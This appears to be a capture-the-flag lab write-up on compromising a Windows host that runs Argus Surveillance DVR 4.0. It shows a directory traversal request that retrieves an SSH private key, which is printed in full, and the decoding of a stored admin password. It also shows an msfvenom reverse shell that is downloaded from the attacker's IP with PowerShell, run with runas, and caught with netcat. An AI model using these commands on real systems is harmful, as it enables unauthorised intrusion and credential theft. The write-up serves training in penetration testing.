## NMAP

This command executes a comprehensive, privileged Nmap scan. It aggressively probes all TCP ports (1-65535) on the target host 192.168.181.179, bypassing host discovery with the assumption the host is up. It identifies open ports, runs default scripts to detect vulnerabilities and gather information, performs service version detection, and attempts operating system identification. The `--open` switch filters the output to report only open ports.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.181.179   --open 
```

The Nmap scan results indicate a Windows host running several services. Port 22 is running Bitvise WinSSHD 8.48, a Windows SSH server. Ports 135, 139, and 445 confirm the host is a Windows system offering SMB and RPC services. The web proxy on port 8080 is hosting an "Argus Surveillance DVR" web interface, which is a significant finding as such applications are frequently associated with known vulnerabilities. Multiple high-numbered ports are running Microsoft RPC. The presence of an outdated, non-commercial SSH server and a surveillance system presents multiple potential attack vectors for credential attacks, SMB exploitation, and web application testing.

```bash
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http-proxy
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC


```

The provided file appears to be a screenshot analysis or note of the web interface found on port 8080. It confirms the service as the "Argus Surveillance DVR" application. The interface presents administrative panels for managing cameras, records, users, and program options. The note "There are no cameras. To create a camera click here" suggests the system may be in a default or unconfigured state. This administrative interface is a primary target for authentication bypass, default credential testing, and exploitation of known vulnerabilities in the Argus DVR software.


![BloodHound Analysis](images/dvr1.png)

The image captures the user management section of the Argus Surveillance DVR web application. It shows a user table with a default "Administrator" account and options to change its password. The interface allows the creation of new users with configurable permissions packages. The copyright notice dates the software between 2000-2008, indicating it is likely outdated and contains unpatched vulnerabilities. The presence of an administrative interface with password change functionality is a direct target for credential-based attacks, including brute-forcing the default administrator password.

![BloodHound Analysis](images/dvr2.png)

This image displays the "About" information for the Argus Surveillance DVR software, confirming it is version 4.0 released on December 18, 2008, and is currently unregistered. This specific version and release date are critical for vulnerability research, as they allow for the precise identification of known, exploitable security flaws in this outdated and unlicensed application.

![BloodHound Analysis](images/dvr3.png)

The provided command is a proof-of-concept exploit targeting a directory traversal vulnerability in the Argus Surveillance DVR web interface. The curl request manipulates the `RESULTPAGE` parameter to traverse out of the web directory and attempts to read the private SSH key file located at `/Users/Viewer/.ssh/id_rsa` on the Windows host. This demonstrates a critical information disclosure flaw that could lead to the compromise of the SSH service on port 22.

```bash
curl "http://192.168.181.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" 
```

The command successfully retrieved the contents of the private SSH key file. This is the `id_rsa` key for the user 'viewer', confirming the directory traversal exploit was successful. This private key can now be used to attempt authentication against the SSH service running on port 22 of the target host, potentially granting unauthorized access to the system.

```bash
 cat id_rsa   
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

The command changes the permissions of the `id_rsa` private key file to make it executable. This is a standard step to ensure the file has the correct read permissions for the current user, which is a necessary prerequisite before attempting to use the key for SSH authentication.

```bash
sudo chmod +x id_rsa 
```

The SSH command successfully authenticated to the target host 192.168.181.179 on port 22 using the previously obtained private key, logging in as the user 'viewer'. The subsequent `whoami` command confirms the user context as 'dvr4\viewer' on the Windows machine. The `type local.txt` command then reads the contents of a file on the desktop, revealing a flag or hash: `693c7d477217fbcafda94b183815c8d7`. This demonstrates a successful initial compromise and local file access on the host.

```bash
ssh -i id_rsa viewer@192.168.181.179 

C:\Users\viewer>whoami
dvr4\viewer

C:\Users\viewer\Desktop>type local.txt
693c7d477217fbcafda94b183815c8d7

```

The command reads the `DVRParams.ini` configuration file for the Argus Surveillance DVR software. It reveals a stored administrator credential. The `LoginName0` is "Administrator" and the associated `Password1` field contains an obfuscated or hashed value: `5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE`. This credential data is a prime target for cracking or decoding to escalate privileges from the 'viewer' user to the application's administrator account.

```bash
C:\ProgramData\PY_Software\Argus Surveillance DVR>type "DVRParams.ini"   

LoginName0=Administrator                                                                                                                                                                     
FullName0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083  

viewer
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE     
```

The executed Python exploit successfully deciphered the obfuscated password from the DVR configuration file. The output reveals the plaintext password for the 'Administrator' account is "ImWatchingu0". This provides valid credentials for the Argus Surveillance DVR web application's administrative interface, enabling a significant privilege escalation within the application.

```bash
python2 exploit.py 

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] 5E53:I
[+] 4D7B:m
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] C875:i
[+] EB60:n
[+] 3CD9:g
[+] D8E1:Y
[+] BD8F:0
[+] AAFE:u


```

The second execution of the password cracking tool attempts to decode another obfuscated string, likely from a different user or field in the configuration file. The partial output decodes to "14WatchD0g", with the final character remaining unknown. This reveals a second, potentially valid credential that could be used for further authentication attempts against the system or application.

```bash
python2 exploit.py  

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown


```

The command uses msfvenom to generate a Windows reverse TCP shell payload. The payload is configured to connect back to the attacker's IP address 192.168.45.193 on port 443. The output is saved as a Windows executable file named `shell.exe`. This malicious executable, when executed on the target host, will provide a reverse shell connection to the attacker.

```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.193 LPORT=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

The PowerShell command downloads the malicious `shell.exe` file from the attacker's web server at 192.168.45.193 and saves it to the user 'viewer' directory on the target Windows machine. This is the file transfer step required to stage the payload for execution on the compromised host.

```bash
PS C:\users\viewer> Invoke-WebRequest "http://192.168.45.193/shell.exe" -OutFile "C:\Users\Viewer\shell.exe"   
```

The `runas` command is used to execute the `shell.exe` payload with the privileges of the 'administrator' user. The command prompts for the administrator's password. Without providing the correct password, the execution attempt fails, and the payload is not launched under the elevated context. This indicates a failed privilege escalation attempt due to incorrect or missing credentials.

```bash
PS C:\users\viewer> runas /user:administrator "C:\users\viewer\shell.exe"                                                                                                                    
Enter the password for administrator:                                                                                                                                                        
Attempting to start C:\users\viewer\shell.exe as user "DVR4\administrator" ...                                                                                                               
PS C:\users\viewer>      

```

The Netcat listener on port 443 receives a connection from the target host, establishing a reverse shell. The shell session indicates execution is occurring in the context of 'C:\Users\Administrator\Desktop', confirming successful privilege escalation to the local Administrator account. The command `type proof.txt` retrieves the final proof of compromise, a flag with the value `2c37f8949b85d717be5ebc22dcc97c43`. This demonstrates complete system takeover.

```bash
nc -lvp 443
listening on [any] 443 ...
192.168.181.179: inverse host lookup failed: Unknown host
connect to [192.168.45.193] from (UNKNOWN) [192.168.181.179] 50754
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>type proof.txt 
type proof.txt
2c37f8949b85d717be5ebc22dcc97c43

```
